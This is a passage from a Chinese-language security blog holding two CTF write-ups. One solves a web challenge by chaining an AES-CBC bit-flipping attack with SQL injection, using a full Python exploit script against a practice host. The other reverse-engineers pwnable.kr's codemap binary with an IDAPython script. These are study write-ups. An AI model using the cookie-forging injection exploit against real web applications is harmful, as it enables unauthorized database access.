class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body" style="margin:0 auto"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper" style="margin:0 auto;width:800px;"&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;input id to login&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="id" type="text" class="input id" value="id" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;&lt;input type="submit" name="submit" value="Login" class="button" /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>分析整个代码可以发现，通过post的id值由于被<code>sqliCheck</code>函数过滤了关键字无法在此处注入。另一处可注入的点在sql语句拼接的时候，在这里代码把解序列化后的数据直接拼接进sql语句中，如果可以控制此处的数据那么就可以造成注入。<br>那该如何控制这里的数据呢？可以发现，程序使用了<code>aes-128-cbc</code>的加密算法来加密和解密，而这种算法是存在字节反转攻击的，再配合程序在解序列化失败后返回解密后的明文，我们就可以控制密文来得到我们想要的任意明文，从而控制sql语句。对于<code>cbc字节反转攻击</code>的利用方法和原理网上有很多，抽时间自己也总结一下。下面是我的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64,urllib,math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">    payload = <span class="string">'0 union select 1,value,3 from you_want limit 1#'</span>  </span><br><span class="line">    <span class="comment">#payload = 'x'*20</span></span><br><span class="line">    </span><br><span class="line">    plaintext = <span class="string">'a:1:&#123;s:2:"id";s:%d:"%s";&#125;'</span>%(len(payload),payload)</span><br><span class="line">    badText = <span class="string">'x'</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> len(plaintext)%<span class="number">16</span>:</span><br><span class="line">        <span class="keyword">if</span> len(plaintext)%<span class="number">16</span>&gt;<span class="number">3</span>:</span><br><span class="line">            badText = <span class="string">'x'</span>*(len(plaintext)%<span class="number">16</span><span class="number">-3</span>)+<span class="string">'";&#125;'</span></span><br><span class="line">        <span class="keyword">elif</span> len(plaintext)%<span class="number">16</span> == <span class="number">3</span>:</span><br><span class="line">            badText = <span class="string">'";&#125;'</span></span><br><span class="line">        <span class="keyword">elif</span> len(plaintext)%<span class="number">16</span> == <span class="number">1</span>:</span><br><span class="line">            badText = <span class="string">'&#125;'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            badText = <span class="string">';&#125;'</span></span><br><span class="line">    r = requests.post(url,data=&#123;<span class="string">'id'</span>:<span class="string">'x'</span>*len(payload)&#125;)</span><br><span class="line">    sc = r.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">','</span>)</span><br><span class="line">    </span><br><span class="line">    iv = <span class="string">'a'</span>*<span class="number">16</span></span><br><span class="line">    cipher = sc[<span class="number">1</span>][sc[<span class="number">1</span>].find(<span class="string">'='</span>)+<span class="number">1</span>:]</span><br><span class="line">    blockNum = len(cipher)/<span class="number">16</span></span><br><span class="line">    cipher = base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">    blockNum = len(cipher)/<span class="number">16</span></span><br><span class="line">    cipherBlock = [iv]</span><br><span class="line">    cipherBlock += [cipher[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(blockNum)]</span><br><span class="line">    plainBlock = [plaintext[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(blockNum)]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(blockNum<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">        s1 = plainBlock[i]</span><br><span class="line">        s2 = cipherBlock[i]</span><br><span class="line">        tmp = <span class="string">''</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(len(s1)):</span><br><span class="line">            tmp += chr(ord(s1[j])^ord(badText[j])^ord(s2[j]))</span><br><span class="line"></span><br><span class="line">        cipherBlock[i]=tmp+s2[len(tmp):]</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            iv = cipherBlock[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        iv_new = urllib.quote(base64.b64encode(iv))</span><br><span class="line">        cipher_new = urllib.quote(base64.b64encode(<span class="string">''</span>.join(cipherBlock[<span class="number">1</span>:])))</span><br><span class="line">        headers=&#123;<span class="string">'Cookie'</span>:<span class="string">'iv=&#123;&#125;;cipher=&#123;&#125;'</span>.format(iv_new,cipher_new)&#125;</span><br><span class="line"></span><br><span class="line">        r = requests.get(url,headers=headers)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> i != <span class="number">0</span>: </span><br><span class="line">            tmp = r.text[r.text.find(<span class="string">'decode'</span>)+<span class="number">8</span>:r.text.rfind(<span class="string">"')"</span>)]</span><br><span class="line">            badText = base64.b64decode(tmp)[<span class="number">16</span>*(i<span class="number">-1</span>):<span class="number">16</span>*i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> r.text.encode(<span class="string">'gb18030'</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">work()</span><br></pre></td></tr></table></figure></p>
<p>最后通过控制exp中的<code>payload</code>来注入sql语句，读取flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\gyh\Desktop&gt;python 1.py</span><br><span class="line">??????&lt;h1&gt;&lt;center&gt;Hello!flag&#123;c42b2b758a5a36228156d9d671c37f19&#125;&lt;/center&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">C:\Users\gyh\Desktop&gt;</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题主要考察<code>cbc字节反转攻击</code>，再结合本题在解序列化失败后返回解密的明文的特定的情况，可以控制整个明文字符串。但是当时没注意本题的这种特定情况导致我浪费了很多时间，看来细心很重要啊。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/07/pwnable.kr-codemap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/07/pwnable.kr-codemap/" itemprop="url">
                  pwnable.kr-codemap
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-07 12:53:12" itemprop="dateCreated datePublished" datetime="2018-02-07T12:53:12+08:00">2018-02-07</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/07/pwnable.kr-codemap/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/07/pwnable.kr-codemap/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/07/pwnable.kr-codemap/" class="leancloud_visitors" data-flag-title="pwnable.kr-codemap">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题当时理解了逻辑，但是不知道怎么编写调试用的自动化脚本还是参考了别人的写的代码。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>ssh连上去后无法读源码，需要逆向<code>codemap.exe</code>。读取<code>readme</code>文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">codemap@ubuntu:~$ cat readme</span><br><span class="line">reverse engineer the <span class="string">'codemap.exe'</span> binary, <span class="keyword">then</span> connect to codemap daemon(nc 0 9021),</span><br><span class="line">the daemon will ask you some question, provide the correct answer to get flag.</span><br></pre></td></tr></table></figure></p>
<p>nc连上去后要求输入第二和第三大堆块里面的字符串，开始以为问题是随机的，试了几次确定只问了这两个堆块。那么getflag关键就是逆向<code>codemap.exe</code>，下面给出ida反编译的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi@3</span></span><br><span class="line">  <span class="keyword">int</span> (***v4)(<span class="keyword">void</span>); <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">int</span> (***v5)(<span class="keyword">void</span>); <span class="comment">// edi@3</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// esi@4</span></span><br><span class="line">  <span class="keyword">int</span> (**v7)(<span class="keyword">void</span>); <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> (***v8)(<span class="keyword">void</span>); <span class="comment">// ecx@5</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// eax@8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// esi@8</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// ebx@8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// esi@9</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// [sp+10h] [bp-60h]@0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// [sp+14h] [bp-5Ch]@8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// [sp+18h] [bp-58h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// [sp+1Ch] [bp-54h]@1</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [sp+20h] [bp-50h]@9</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [sp+6Ch] [bp-4h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"I will make 1000 heap chunks with random size\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"each heap chunk has a random string\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"press enter to start the memory allocation\n"</span>);</span><br><span class="line">  sub_4040B1();</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  srand(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">10000</span> * rand() % <span class="number">1337</span>;</span><br><span class="line">    v4 = (<span class="keyword">int</span> (***)(<span class="keyword">void</span>))<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">    v5 = v4;</span><br><span class="line">    v19 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v4 = (<span class="keyword">int</span> (**)(<span class="keyword">void</span>))&amp;off_40F2EC;</span><br><span class="line">      v6 = (<span class="number">10000</span> * v3 &gt;&gt; <span class="number">1</span>) + <span class="number">123</span>;</span><br><span class="line">      v7 = (<span class="keyword">int</span> (**)(<span class="keyword">void</span>))<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7[<span class="number">1</span>] = (<span class="keyword">int</span> (*)(<span class="keyword">void</span>))v6;</span><br><span class="line">        v5[<span class="number">1</span>] = v7;</span><br><span class="line">        v8 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        v8 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v19 = <span class="number">-1</span>;</span><br><span class="line">    v9 = (**v8)();</span><br><span class="line">    v10 = v9 % <span class="number">0x186A0</span>;</span><br><span class="line">    v15 = v9 % <span class="number">0x186A0</span>;</span><br><span class="line">    v11 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v9 % <span class="number">0x186A0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt;= <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      qmemcpy(&amp;v18, <span class="string">"abcdefghijklmnopqrstubwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span>, <span class="number">0x3F</span>u);</span><br><span class="line">      v12 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v11[++v12 - <span class="number">1</span>] = *(&amp;v18 + rand() % <span class="number">62</span>);</span><br><span class="line">      <span class="keyword">while</span> ( v12 &lt; <span class="number">0xF</span> );</span><br><span class="line">      v11[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v15 &gt; v17 )</span><br><span class="line">      &#123;</span><br><span class="line">        v17 = v15;</span><br><span class="line">        v14 = v11;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( ++v16 &gt;= <span class="number">0x3E8</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    srand(v16);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"the allcated memory size of biggest chunk is %d byte\n"</span>, v17);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"the string inside that chunk is %s\n"</span>, v14);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"log in to pwnable.kr and anwer some question to get flag.\n"</span>);</span><br><span class="line">  sub_4040B1();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序大致逻辑是随机生成<code>1000</code>个堆块，并且每个堆块中会存放随机的字符串，最后输出最大的堆块大小和里面的字符串。可以发现程序使用的<code>srand</code>函数的种子都是固定值，那么在使用<code>rand</code>函数的时候就不是真正的随机，所以堆块的大小和字符串都是固定的。<br>按照题目要求，需要给1000个堆块排序找到第二和第三大堆块，这里需要知道每次循环中堆块的大小和字符串存在哪。根据题目提示在<code>0x403E65</code>处下断点并观察<code>ebx,eax</code>可以发现ebx存储的是该堆块的字符串，eax存储的是堆块的大小。<br>但是要获取题目所要的字符串在1000个堆块中找，手找是不可能的，只能用自动化代码。<br>以前看过《Python灰帽子》里面讲的有，但是没好好读现在也没啥印象了，参考<a href="http://blog.csdn.net/pwd_3/article/details/75635647" target="_blank" rel="noopener">这篇writeup的代码</a>用<code>idapython</code>写的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">max_eax = <span class="number">0</span></span><br><span class="line">second_eax = <span class="number">0</span></span><br><span class="line">third_eax = <span class="number">0</span></span><br><span class="line">max_ebx = <span class="number">0</span></span><br><span class="line">second_ebx = <span class="number">0</span></span><br><span class="line">third_ebx = <span class="number">0</span></span><br><span class="line">ft=<span class="number">0</span></span><br><span class="line">sd=<span class="number">0</span></span><br><span class="line">td=<span class="number">0</span></span><br><span class="line"><span class="comment">#AddBpt(0x263E65).text:00403E65（在这一句下断点）jbe     short loc_403E6D</span></span><br><span class="line"><span class="comment">#在题目提示的地方前下一个断点。</span></span><br><span class="line">StartDebugger(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>)<span class="comment">#启动具有默认参数的调试器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> xrange(<span class="number">999</span>): </span><br><span class="line">    code = GetDebuggerEvent(WFNE_SUSP|WFNE_CONT, <span class="number">-1</span>) <span class="comment"># 恢复执行，等待断点</span></span><br><span class="line">    eax = GetRegValue(<span class="string">"EAX"</span>)</span><br><span class="line">    ebx = GetRegValue(<span class="string">"EBX"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> max_eax &lt; eax :</span><br><span class="line">        td=sd</span><br><span class="line">        sd=ft</span><br><span class="line">        ft=count</span><br><span class="line">        third_eax = second_eax</span><br><span class="line">        third_ebx = second_ebx</span><br><span class="line">        second_eax = max_eax</span><br><span class="line">        second_ebx = max_ebx</span><br><span class="line">        max_eax = eax;  </span><br><span class="line">        max_ebx = ebx;  </span><br><span class="line">    <span class="keyword">elif</span> second_eax &lt; eax :</span><br><span class="line">        td=sd</span><br><span class="line">        sd=count</span><br><span class="line">        third_eax = second_eax</span><br><span class="line">        third_ebx = second_ebx</span><br><span class="line">        second_eax = eax</span><br><span class="line">        second_ebx = ebx</span><br><span class="line">    <span class="keyword">elif</span> third_eax &lt; eax:</span><br><span class="line">        td=count</span><br><span class="line">        third_eax = eax</span><br><span class="line">        third_ebx = ebx</span><br><span class="line">Message(<span class="string">"max eax: %d, ebx: %x, count %d, second eax: %d, ebx: %x, count %d, third eax: %d, ebx: %x, count %d\n"</span> % (max_eax, max_ebx, ft, second_eax, second_ebx, sd, third_eax, third_ebx, td))</span><br></pre></td></tr></table></figure></p>
<p>最后输出<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">max eax: <span class="number">99879</span>, ebx: <span class="number">2</span>aa3108, str: X12nM7yCJcu0x5u, count <span class="number">546</span>,</span><br><span class="line">second eax: <span class="number">99679</span>, ebx: <span class="number">1e22658</span>, str: roKBkoIZGMUKrMb, count <span class="number">290</span>, </span><br><span class="line">third eax: <span class="number">99662</span>, ebx: <span class="number">2</span>ec5b40, str: <span class="number">2</span>ckbnDUabcsMA2s, count <span class="number">629</span></span><br></pre></td></tr></table></figure></p>
<p>回答问题成功getflag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">codemap@ubuntu:~$ nc 0 9021</span><br><span class="line">What is the string inside 2nd biggest chunk? :</span><br><span class="line">roKBkoIZGMUKrMb</span><br><span class="line">Wait <span class="keyword">for</span> 10 seconds to prevent brute-forcing...</span><br><span class="line">What is the string inside 3rd biggest chunk? :</span><br><span class="line">2ckbnDUabcsMA2s</span><br><span class="line">Wait <span class="keyword">for</span> 10 seconds to prevent brute-forcing...</span><br><span class="line">Congratz! flag : select_eax_from_trace_order_by_eax_desc_limit_20</span><br><span class="line">codemap@ubuntu:~$</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>做了这道题我准备去好好在读一遍《Python灰帽子》。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">r00tnb</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">44</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">3</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">6</span>
                    <span class="site-state-item-name">标签</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/r00tnb" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="mailto:1912971419@qq.com.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  
                </span>
              
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://meiyoulianjie.com/" title="还没有T_T" target="_blank">还没有T_T</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
